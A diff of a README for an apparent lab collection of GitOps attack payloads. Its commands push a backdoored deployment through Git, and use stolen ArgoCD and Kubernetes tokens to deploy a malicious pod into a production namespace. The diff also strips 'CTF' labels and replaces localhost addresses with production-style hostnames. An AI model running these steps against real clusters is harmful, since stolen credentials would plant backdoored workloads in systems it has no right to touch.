@@ -47,11 +47,11 @@ This directory contains example malicious payloads that demonstrate GitOps pipel
 
 ## Using These Payloads
 
-### Method 1: Via Git (Recommended for CTF)
+### Method 1: Via Git (Recommended for the deep dive)
 
 ```bash
 # Clone the production-manifests repository
-git clone http://localhost:30004/ctf-admin/production-manifests.git
+git clone http://gitea-prod.sc.local:31080/sc-admin/production-manifests.git
 cd production-manifests/recipe-api
 
 # Replace deployment with backdoored version
@@ -70,11 +70,11 @@ git push origin main
 ```bash
 # Using stolen ArgoCD credentials from .env.production
 export ARGOCD_AUTH_TOKEN=eyJhbGci...
-export ARGOCD_SERVER=localhost:30443
+export ARGOCD_SERVER=argocd.sc.local:31443
 
 # Deploy malicious pod directly
 argocd app create malicious-cache \
-  --repo http://gitea-http.gitea.svc.cluster.local:3000/ctf-admin/attack-manifests.git \
+  --repo http://gitea-http.gitea.svc.cluster.local:3000/sc-admin/attack-manifests.git \
   --path malicious-pod \
   --dest-server https://kubernetes.default.svc \
   --dest-namespace production
@@ -84,7 +84,7 @@ argocd app create malicious-cache \
 
 ```bash
 # Using credentials from .env.production
-kubectl --server=https://ctf-production-control-plane:6443 \
+kubectl --server=https://production-cluster-control-plane:6443 \
   --token=$KUBE_TOKEN \
   apply -f malicious-pod.yaml
 ```
